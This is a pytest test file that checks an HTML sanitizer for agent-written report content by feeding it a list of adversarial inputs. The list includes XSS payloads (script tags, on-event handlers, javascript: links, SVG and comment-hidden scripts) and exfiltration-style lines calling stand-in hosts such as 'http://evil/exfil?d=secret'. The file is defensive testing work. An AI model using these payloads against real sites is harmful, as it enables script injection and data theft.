"""Adversarial tests for _sanitize_agent_html.

These vectors come from the 2026-05-08 review (security + adversarial
reviewers). The sanitizer must drop EVERY one of these payloads to safe
text — the report.html is served by the membership-gated portal route, so
any bypass becomes stored XSS / data exfiltration / SSRF.
"""
from __future__ import annotations

import sys
from pathlib import Path

import pytest

_SCRIPTS_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_SCRIPTS_DIR))

# Resolve src/shared (for nh3 imports + report_base if needed)
_REPO_ROOT = Path(__file__).resolve().parents[5]
sys.path.insert(0, str(_REPO_ROOT))

from render_report import (  # noqa: E402
    _sanitize_agent_html,
    _AGENT_HTML_ALLOWED_TAGS,
    _AGENT_HTML_ALLOWED_CLASS_NAMES,
    _SANITIZER_VERSION,
    _payload_signature,
)


# Each vector is (input, label, "must NOT contain" tokens)
_ADVERSARIAL_VECTORS = [
    ("<script>alert(1)</script>", "script tag",
     ["script", "alert"]),
    ("<SCRIPT >alert(1)</SCRIPT>", "mixed-case script tag",
     ["script", "SCRIPT", "alert"]),
    ("<span onclick=alert(1)>x</span>", "unquoted on-handler",
     ["onclick", "alert"]),
    ("<span onclick='alert(1)'>x</span>", "single-quoted on-handler",
     ["onclick", "alert"]),
    ('<span onclick="alert(1)">x</span>', "double-quoted on-handler",
     ["onclick", "alert"]),
    ("<span/onclick=alert(1)>x</span>", "malformed slash-attr",
     ["onclick", "alert"]),
    ("<span tabindex=1 onfocus=alert(1)>x</span>", "tabindex+onfocus",
     ["onfocus", "tabindex", "alert"]),
    ('<span style="background:url(http://attacker)">x</span>',
     "style with url() exfil",
     ["style=", "background", "url(", "attacker"]),
    ("<span style=display:block onclick=alert(1)>x</span>",
     "multi-attr unquoted",
     ["style=", "onclick", "alert"]),
    ("<a href='javascript:alert(1)'>x</a>", "javascript: href",
     ["javascript:", "alert", "href="]),
    ("<a href='http://evil/exfil?d=secret'>x</a>", "data-exfil href",
     ["href=", "evil"]),
    ("<iframe src='http://evil'></iframe>", "iframe",
     ["iframe", "evil"]),
    ("<object data='http://evil'></object>", "object",
     ["object data="]),
    ("<embed src='http://evil'>", "embed",
     ["embed src"]),
    ("<form action='http://evil'><input></form>", "form",
     ["form", "input", "action="]),
    ("<style>body{background:url(http://evil)}</style><div>ok</div>",
     "style block",
     ["style>", "@import", "background:url"]),
    ("<svg><img src=x onload=alert(1)></svg>", "svg mutation xss",
     ["svg", "onload", "alert"]),
    ("<!-- <script>alert(1)</script> --><div>ok</div>", "comment-hidden",
     ["<!--", "script", "alert"]),
    ("<span class='evil-cls injected'>x</span>", "off-allowlist class",
     ["evil-cls", "injected"]),
    ("<span class='rprt-callout success injected'>ok</span>",
     "mixed allowed+evil class",
     ["injected"]),
    ("<TABLE><TR><TD ONCLICK=alert(1)>x</TD></TR></TABLE>", "uppercase table",
     ["onclick", "ONCLICK", "alert"]),
    ("<span title='\"><script>alert(1)</script>'>x</span>",
     "attribute-context script smuggle",
     ["script", "alert", "title="]),
    ("javascript:alert(1)", "bare javascript URI",
     []),  # bare text passes through; the URI alone has no XSS surface
    ("<div data-evil='http://attacker'>x</div>", "data-* attribute",
     ["data-evil", "attacker"]),
]


@pytest.mark.parametrize("raw,label,must_not_contain", _ADVERSARIAL_VECTORS)
def test_sanitizer_drops_adversarial_payload(raw, label, must_not_contain):
    out = _sanitize_agent_html(raw)
    out_lower = out.lower()
    for token in must_not_contain:
        assert token.lower() not in out_lower, (
            f"[{label}] sanitizer kept forbidden token {token!r} in output: {out!r}"
        )


def test_sanitizer_keeps_allowed_tags_and_classes():
    raw = (
        '<div class="rprt-callout success">'
        '<span class="ckind">verdict</span>'
        '<h3 class="ctitle">title</h3>'
        '<p>body</p>'
        '<ul><li>item</li></ul>'
        '</div>'
    )
    out = _sanitize_agent_html(raw)
    assert '<div class="rprt-callout success">' in out
    assert '<span class="ckind">' in out
    assert '<h3 class="ctitle">' in out
    assert '<p>body</p>' in out
    assert '<ul>' in out and '<li>item</li>' in out


def test_sanitizer_strips_unknown_classes_only():
    raw = '<span class="rprt-callout injected-evil success">ok</span>'
    out = _sanitize_agent_html(raw)
    assert "rprt-callout" in out
    assert "success" in out
    assert "injected-evil" not in out


def test_sanitizer_handles_empty():
    assert _sanitize_agent_html("") == ""
    assert _sanitize_agent_html(None) == ""  # type: ignore[arg-type]


def test_payload_signature_includes_sanitizer_version():
    sig_a = _payload_signature("geo", "brief", "payload")
    # Same inputs → same sig
    assert sig_a == _payload_signature("geo", "brief", "payload")
    # Sanitizer version differs (we hash _SANITIZER_VERSION as the first
    # field) — the version constant itself should be non-empty.
    assert _SANITIZER_VERSION
    # Different inputs → different sig
    assert sig_a != _payload_signature("competitive", "brief", "payload")


def test_allowlists_are_well_formed():
    # No empty tag names; classes are non-empty
    assert all(t for t in _AGENT_HTML_ALLOWED_TAGS)
    assert all(c for c in _AGENT_HTML_ALLOWED_CLASS_NAMES)
    # Defensive: lower-case tag names (nh3 expects lowercase)
    assert all(t == t.lower() for t in _AGENT_HTML_ALLOWED_TAGS)
